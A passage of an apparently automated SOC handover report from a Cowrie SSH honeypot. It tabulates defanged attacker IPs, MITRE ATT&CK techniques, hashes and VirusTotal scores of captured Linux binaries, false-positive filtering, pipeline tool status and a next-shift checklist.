| `116.193.191[.]104` | 1 | 2026-03-23 13:26 | 2026-03-23 13:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.247.239[.]202` | 1 | 2026-03-23 14:37 | 2026-03-23 14:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.36[.]248` | 1 | 2026-03-23 14:03 | 2026-03-23 14:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.71.149[.]30` | 1 | 2026-03-23 13:31 | 2026-03-23 13:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]233` | 1 | 2026-03-23 13:28 | 2026-03-23 13:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-03-23 14:17 | 2026-03-23 14:18 | 31s | 0 | `T1592` | 🟢 LOW |
| `182.95.176[.]206` | 1 | 2026-03-23 14:13 | 2026-03-23 14:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-03-23 13:44 | 2026-03-23 13:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `187.87.239[.]24` | 1 | 2026-03-23 14:25 | 2026-03-23 14:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.133.99[.]235` | 1 | 2026-03-23 13:24 | 2026-03-23 13:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.76.106[.]149` | 1 | 2026-03-23 14:33 | 2026-03-23 14:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-03-23 13:04 | 2026-03-23 13:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `75.138.193[.]44` | 1 | 2026-03-23 13:38 | 2026-03-23 13:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `79.255.254[.]107` | 1 | 2026-03-23 13:19 | 2026-03-23 13:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.22.58[.]11` | 1 | 2026-03-23 13:39 | 2026-03-23 13:40 | 64s | 0 | `T1592` | 🟢 LOW |
| `83.59.93[.]108` | 1 | 2026-03-23 14:15 | 2026-03-23 14:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.19.44[.]93` | CN | China Mobile Communications Corporation | **100** ⚠️ | 21 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `75.138.193[.]44` | US | Charter Communications LLC | **100** ⚠️ | 1 |
| `182.95.176[.]206` | IN | Bharti Airtel Limited | **100** ⚠️ | 21 |
| `111.70.23[.]250` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 23 |
| `118.193.61[.]170` | JP | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `183.81.33[.]183` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `83.59.93[.]108` | ES | Telefonica de Espana SAU | **100** ⚠️ | 1 |
| `106.124.137[.]21` | CN | CHINANET Guangdong province network | **100** ⚠️ | 32 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 62 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (11.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 13 priority case(s) shown individually · 26 recon entry/entries in table (5 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-23T14:53:27Z_
